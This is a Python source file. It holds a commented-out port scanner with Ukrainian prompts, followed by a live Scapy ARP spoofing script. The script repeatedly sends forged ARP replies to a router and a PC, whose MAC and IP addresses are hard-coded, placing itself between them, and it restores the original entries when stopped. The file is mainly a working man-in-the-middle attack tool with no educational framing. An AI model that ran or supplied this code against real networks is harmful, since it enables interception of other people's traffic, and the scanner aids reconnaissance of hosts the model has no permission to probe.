# import socket
# import re
# import concurrent.futures
#
# # Регулярні вирази для перевірки IP-адреси та діапазону портів
# ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
# port_range_pattern = re.compile(r"(\d+)-(\d+)")
# open_ports = []
#
# # Функція для перевірки порту
# def check_port(ip, port):
#     try:
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#             s.settimeout(1)  # Тайм-аут для кожного підключення
#             s.connect((ip, port))
#             return port  # Порт відкритий
#     except (socket.timeout, socket.error):
#         return None  # Порт закритий
#
# # Запит IP-адреси для сканування
# while True:
#     ip_address = input("Будь ласка, введіть IP-адресу для сканування: ")
#     if ip_pattern.match(ip_address):
#         print(f"{ip_address} є дійсною IP-адресою.")
#         break
#     else:
#         print("Невірна IP-адреса. Будь ласка, спробуйте ще раз.")
#
# # Запит діапазону портів
# while True:
#     port_range = input("Введіть діапазон портів від 1 до 65535 (наприклад, 100-200): ").replace(" ", "")
#     port_range_match = port_range_pattern.match(port_range)
#     if port_range_match:
#         port_start = int(port_range_match.group(1))
#         port_end = int(port_range_match.group(2))
#         if 0 <= port_start <= port_end <= 65535:
#             break
#         else:
#             print("Діапазон портів має бути між 0 і 65535. Будь ласка, спробуйте ще раз.")
#     else:
#         print("Невірний формат діапазону портів. Будь ласка, спробуйте ще раз.")
#
# print(f"\nСканування IP: {ip_address} на портах {port_start}-{port_end}...\n")
#
# # Мультитрединг для паралельного сканування портів
# with concurrent.futures.ThreadPoolExecutor() as executor:
#     results = executor.map(lambda port: check_port(ip_address, port), range(port_start, port_end + 1))
#
# # Виведення результатів
# for port in results:
#     if port is not None:
#         open_ports.append(port)
#
# # Виведення результатів
# if open_ports:
#     print(f"\nВідкриті порти на {ip_address}:")
#     for port in open_ports:
#         print(f"Порт {port} відкритий.")
# else:
#     print(f"\nНе знайдено відкритих портів на {ip_address}.")


#!/usr/bin/python

import scapy.all as scapy

def restore_defaults(dest_mac, source_mac, dest_ip, source_ip):
    # creating the packet
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, verbose=False)

def spoofing(target_mac, target_ip, spoofed_ip):
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip)
    # sending the packet
    scapy.send(packet, verbose=False)

def main():
    # Replace these with the actual MAC and IP addresses of the devices
    router_mac = "ac-84-c6-78-7d-9f"  # MAC address of the router
    router_ip = "192.168.0.1"
    pc_mac = "E0-D4-E8-EB-D1-24"  # MAC address of the PC
    pc_ip = "192.168.0.106"

    try:
        while True:
            spoofing(router_mac, router_ip, pc_ip)  # router (target -> spoofed)
            spoofing(pc_mac, pc_ip, router_ip)  # PC (target -> spoofed)
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults(router_mac, pc_mac, router_ip, pc_ip)  # restore router
        restore_defaults(pc_mac, router_mac, pc_ip, router_ip)  # restore PC
        exit(0)

if __name__ == "__main__":
    main()

# target_ip = "192.168.0.106"  # Enter your target IP
# gateway_ip = "192.168.0.1"  # Enter your gateway's IP
